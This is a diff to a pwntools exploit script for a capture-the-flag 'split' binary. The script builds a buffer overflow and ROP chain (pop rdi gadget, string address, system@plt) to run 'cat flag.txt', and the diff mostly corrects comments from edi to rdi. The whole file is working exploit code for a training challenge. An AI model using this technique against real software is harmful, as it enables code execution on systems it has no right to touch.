@@ -39,8 +39,8 @@ io = start()
 # The binary also has an usefulFunction() function that calls
 # system("/bin/ls/"). This function is not called by the code.
 # But because of this the .plt section has an entry for 'system',
-# and since PIE is disabled the entry has a constant address.
-# The address is 0x4005e0, and can be found with
+# and since PIE is disabled, the entry has a constant address.
+# The address of system@plt is 0x4005e0, and can be found with
 #    $ objdump -d -M intel -j .plt ./split
 #    $ rabin2 -i ./split    # alternative
 #
@@ -52,8 +52,9 @@ io = start()
 # The plan here is to build a ROP chain to call
 #    system("/bin/cat flag.txt")
 
-# Look for a 'pop edi' instruction, so that we can load edi
-#   $ ropper --type=rop -f ./split --search='pop edi'
+# Look for a 'pop rdi' instruction, so that we can load rdi
+# with the address of "/bin/cat flag.txt".
+#   $ ropper --type=rop -f ./split --search='pop rdi'
 
 # Wait for the prompt.
 msg = io.recvuntil("> ")
@@ -61,13 +62,11 @@ print(msg)
 # Build the input vector as 40 arbitrary bytes plus the first
 # address of a ROP chain, that will overwrithe the saved RIP.
 vector = "A" * 40
-# Address of a "ret" gadget
-#vector += p64(0x4005b9)
-# The address of a "pop edi; ret" gadget
+# The address of a "pop rdi; ret" gadget (found with ropper).
 vector += p64(0x400883)
-# A value for to be popped from the stack by "pop edi".
+# A value for to be popped from the stack by "pop rdi".
 vector += p64(0x00601060)
-# Address of system@plt
+# Address of system@plt.
 vector += p64(0x4005e0)
 io.sendline(vector)
 io.interactive()
